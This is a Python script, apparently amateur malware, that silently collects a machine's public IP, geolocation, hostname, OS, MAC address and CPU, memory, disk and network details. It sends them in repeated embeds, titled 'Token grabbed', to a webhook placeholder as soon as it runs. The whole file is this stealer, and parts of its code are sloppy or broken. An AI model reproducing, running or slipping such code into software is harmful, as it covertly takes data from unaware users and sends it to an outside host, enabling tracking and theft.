import requests
from datetime import datetime
import socket
import uuid
import re
import platform
import psutil
import secrets

# Nu schimba nimic ca te bat!
# do not claim as yours!


webhook = 'webhook here'

def CalculateCurrentTime():
    Tick = datetime.now()

    CurrentTime = Tick.strftime("%H:%M:%S")
    return CurrentTime


def Grabber():
    CurrentTime = CalculateCurrentTime()

    response = requests.get("https://ipinfo.io/json")
    data = response.json()
    ip_address = data["ip"]
    country = data["country"]
    region = data["region"]
    city = data["city"]
    hostname = data["hostname"]
    organization = data["org"]
    postal = data["postal"]
    location = data["loc"]

    info = "IP: **"+ip_address+"**\n Country: **"+country+"**\n Region: **"+region+"**\n City: **"+city+"**\n HostName: **"+hostname+"**\n Org: **"+organization+"**\n Postal: **"+postal+"**\n Loc: **"+location+"**"

    return info, CurrentTime

def get_size(bytes, suffix="B"):
    """
    Scale bytes to its proper format
    e.g:
        1253656 => '1.20MB'
        1253656678 => '1.17GB'
    """
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor

systeminfoheader = "***=== System Information ====***\n\n"
uname = platform.uname()
system = "**System: **" + uname.system + "\n"
nodename = "Node Name: " + uname.node + "\n"
release = "Release: " + uname.release + "\n"
version = "Version: " + uname.version + "\n"
machine = "Machine: " + uname.machine + "\n"
processor = "Processor: " + uname.processor + "\n"
ipadd = f"Ip-Address: {socket.gethostbyname(socket.gethostname())}" + "\n"
macadd = f"Mac-Address: {':'.join(re.findall('..', '%012x' % uuid.getnode()))}" + "\n"
boottimeheader = "***=== Boot Time ====***\n\n"
boot_time_timestamp = psutil.boot_time()
bt = datetime.fromtimestamp(boot_time_timestamp)
boottime = f"Boot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}" + "\n"



cpuinfoheader = "***=== Cpu Info ====***\n\n"
physicalcores = "Physical cores:", psutil.cpu_count(logical=False), "\n"
def convertTuple(tup):
    cacat = ''
    for item in tup:
        caca = str(item)
        resultt = cacat + caca
    return resultt

# totalcoretuple = "Total cores:" + psutil.cpu_count(logical=True) + "\n"
totaltuplexd = (psutil.cpu_count(logical=True))
totalcorestr = str((psutil.cpu_count(logical=True)))
totalcores = "Total cores:" + totalcorestr + "\n"
# print(totalcores)
cpufreq = psutil.cpu_freq()
maxfrequency = f"Max Frequency: {cpufreq.max:.2f}Mhz" + "\n"
minfrequency = f"Min Frequency: {cpufreq.min:.2f}Mhz" + "\n"
currentfrequency = f"Current Frequency: {cpufreq.current:.2f}Mhz" + "\n"
cpuusagepercoreminiheader = "**CPU Usage Per Core:**" + "\n"
for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
    corepercentage = f"Core {i}: {percentage}%" + "\n"
totalcpuusage = f"Total CPU Usage: {psutil.cpu_percent()}%" + "\n"

memoryinfoheader = "***=== Memory Info ====***\n\n"
svmem = psutil.virtual_memory()
totalmem = f"Total: {get_size(svmem.total)}" + "\n"
availablelmem = f"Available: {get_size(svmem.available)}" + "\n"
usedmem = f"Used: {get_size(svmem.used)}" + "\n"
percentagemem = f"Percentage: {svmem.percent}%" + "\n"

swapheader = "***=== Swap ====***\n\n"
swap = psutil.swap_memory()
totalswap = f"Total: {get_size(swap.total)}" + "\n"
freeswap = f"Free: {get_size(swap.free)}" + "\n"
usedswap = f"Used: {get_size(swap.used)}" + "\n"
percentageswap = f"Percentage: {swap.percent}%" + "\n"

diskinfoheader = "***=== Disk Info ====***\n\n"
partandusage = "**Partitions and Usage:**" + "\n"
    # get all disk partitions
partitions = psutil.disk_partitions()
for partition in partitions:
    partdevice = f"=== Device: {partition.device} ==="  + "\n"
    mountpoint = f"  Mountpoint: {partition.mountpoint}"  + "\n"
    filesystype = f"  File system type: {partition.fstype}"  + "\n"
    try:
         partition_usage = psutil.disk_usage(partition.mountpoint)
    except PermissionError:
            # this can be catched due to the disk that
            # isn't ready
         continue
    totalsizedisk = f"  Total Size: {get_size(partition_usage.total)}" + "\n"
    useddisk = f"  Used: {get_size(partition_usage.used)}" + "\n"
    freedisk = f"  Free: {get_size(partition_usage.free)}" + "\n"
    percentagedisk = f"  Percentage: {partition_usage.percent}%" + "\n"
    # get IO statistics since boot
    disk_io = psutil.disk_io_counters()
    totalread = f"Total read: {get_size(disk_io.read_bytes)}" + "\n"
    totalwrite = f"Total write: {get_size(disk_io.write_bytes)}" + "\n"

    networkinfoheader = "***=== Network Info ====***\n\n"
    if_addrs = psutil.net_if_addrs()
    for interface_name, interface_addresses in if_addrs.items():
        for address in interface_addresses:
            interfacenet = f"=== Interface: {interface_name} ===" + "\n"
            if str(address.family) == 'AddressFamily.AF_INET':
                ipaddagain = f"  IP Address: {address.address}" + "\n"
                netmask = f"  Netmask: {address.netmask}" + "\n"
                broadcastip = f"  Broadcast IP: {address.broadcast}" + "\n"
            elif str(address.family) == 'AddressFamily.AF_PACKET':
                macad2d = f"  MAC Address: {address.address}" + "\n"
                netmask2 = f"  Netmask: {address.netmask}" + "\n"
                broadcastmac = f"  Broadcast MAC: {address.broadcast}" + "\n"
    ##get IO statistics since boot
    net_io = psutil.net_io_counters()
    totalbytessent = f"Total Bytes Sent: {get_size(net_io.bytes_sent)}" + "\n"
    totalbytesreceived = f"Total Bytes Received: {get_size(net_io.bytes_recv)}" + "\n"



class Information:
    Webhookurl = webhook
    IpAdress = Grabber()

usertoken = secrets.randbelow(10)

class Receiver:
    def SenderMain():
        Ip, Time = Grabber()
        WebhookData = {
            "embeds": [{
                "title": "I think ill loose my mind in hysteria:mahjong::mahjong:",
                "description": f"Token grabbed :\n\n {Ip}\n\nat time : {Time}",
                "color": 16711680,
            }]
        }
        SendVar = requests.post(url=Information.Webhookurl, json=WebhookData)
Receiver.SenderMain()

class Receiver:
    def SenderMain():
        Time = Grabber()
        # info = 
        hardware = system+nodename+release+version+machine+processor+ipadd+macadd
        WebhookData = {
            "embeds": [{
                "title": systeminfoheader,
                "description": f"{hardware}\n\n user token : {usertoken}",
                "color": 16711680,
            }]
        }
        SendVar = requests.post(url=Information.Webhookurl, json=WebhookData)
Receiver.SenderMain()

class Receiver:
    def SenderMain():
        Time = Grabber()
        # info = 
        hardware = boottime
        WebhookData = {
            "embeds": [{
                "title": boottimeheader,
                "description": f"{hardware}\n\n user token : {usertoken}",
                "color": 16711680,
            }]
        }
        SendVar = requests.post(url=Information.Webhookurl, json=WebhookData)
Receiver.SenderMain()

class Receiver:
    def SenderMain():
        physicalcoresstr = convertTuple(physicalcores)
        hardware = physicalcoresstr+totalcores+maxfrequency+minfrequency+currentfrequency+cpuusagepercoreminiheader+corepercentage+totalcpuusage
        WebhookData = {
            "embeds": [{
                "title": cpuinfoheader,
                "description": f"{hardware}\n\n user token : {usertoken}",
                "color": 16711680,
            }]
        }
        SendVar = requests.post(url=Information.Webhookurl, json=WebhookData)
Receiver.SenderMain()

class Receiver:
    def SenderMain():
        #physicalcoresstr = convertTuple(physicalcores)
        hardware = totalmem+availablelmem+usedmem+percentagemem
        WebhookData = {
            "embeds": [{
                "title": memoryinfoheader,
                "description": f"{hardware}\n\n user token : {usertoken}",
                "color": 16711680,
            }]
        }
        SendVar = requests.post(url=Information.Webhookurl, json=WebhookData)
Receiver.SenderMain()

class Receiver:
    def SenderMain():
        #physicalcoresstr = convertTuple(physicalcores)
        hardware = totalswap+freeswap+usedswap+percentageswap
        WebhookData = {
            "embeds": [{
                "title": swapheader,
                "description": f"{hardware}\n\n user token : {usertoken}",
                "color": 16711680,
            }]
        }
        SendVar = requests.post(url=Information.Webhookurl, json=WebhookData)
Receiver.SenderMain()

class Receiver:
    def SenderMain():
        #physicalcoresstr = convertTuple(physicalcores)
        hardware = partandusage+partdevice+mountpoint+filesystype+totalread+totalwrite
        WebhookData = {
            "embeds": [{
                "title": diskinfoheader,
                "description": f"{hardware}\n\n user token : {usertoken}",
                "color": 16711680,
            }]
        }
        SendVar = requests.post(url=Information.Webhookurl, json=WebhookData)
Receiver.SenderMain()

class Receiver:
    def SenderMain():
        #physicalcoresstr = convertTuple(physicalcores)
        hardware = interfacenet+ipaddagain+netmask+broadcastip+macadd+netmask+broadcastip+totalbytessent+totalbytesreceived
        WebhookData = {
            "embeds": [{
                "title": networkinfoheader,
                "description": f"{hardware}\n\n user token : {usertoken}",
                "color": 16711680,
            }]
        }
        SendVar = requests.post(url=Information.Webhookurl, json=WebhookData)
Receiver.SenderMain()
